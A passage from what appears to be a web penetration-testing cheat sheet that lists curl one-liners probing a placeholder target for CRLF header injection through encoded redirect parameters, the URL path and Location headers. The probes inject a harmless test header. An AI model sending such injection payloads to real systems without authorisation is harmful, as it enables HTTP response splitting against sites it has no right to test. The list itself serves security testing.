...
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Headers · **Context:** No auth

## Double-encoded CRLF
```bash
curl -skD - 'https://<TARGET>/redirect?next=%250d%250aX-Test%253a%2520crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Encoding · **Context:** No auth

## Path CRLF
```bash
curl -skD - 'https://<TARGET>/%0d%0aX-Test:%20crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Path · **Context:** No auth

## Location-header target
```bash
curl -skD - 'https://<TARGET>/redirect?url=https://example.com%0d%0aX-Test:%20crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** Redirect, CRLF · **Context:** No auth
